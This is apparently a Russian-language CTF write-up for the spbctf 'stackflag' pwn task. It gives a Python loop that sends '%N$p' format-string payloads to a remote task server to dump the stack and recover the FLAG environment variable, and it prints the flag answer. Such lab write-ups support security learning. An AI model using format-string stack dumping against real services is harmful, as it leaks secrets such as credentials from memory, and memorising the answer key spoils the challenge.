[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn2_mc7)
Описание:
Флаг находится в переменной окружения FLAG. Переменные окружения лежат на стеке. Вам надо сдампить весь стек через уязвимость форматной строчки.
`nc 109.233.56.90 11608`
**[stackflag](https://pwn.spbctf.ru/files/canary/stackflag)**

Эксплоит для чтения всего стека:
``` python
io = start()

for i in range(7, 10000):
    payload = f'%{i}$p'.encode()
    io.sendlineafter(b': ', payload)
    
    response = io.recvline()[:-1].decode()
    try:
        response = int(response, 16)
        print(i, p64(response).decode())
    except:
        pass
    
io.interactive()
```

Локально переменные окружения начинаются с индекса 781:
![{B3F5F0AE-2E90-41F6-8BF2-D9745B635957}](../../../../z.%20Images/{B3F5F0AE-2E90-41F6-8BF2-D9745B635957}.png)

Запуск с подключением:
![{D850BB0D-7F5A-4749-8870-D63438482474}](../../../../z.%20Images/{D850BB0D-7F5A-4749-8870-D63438482474}.png)

Ответ: `spbctf{a75b4c9e6b00102a855e5e7cb0918ab5}`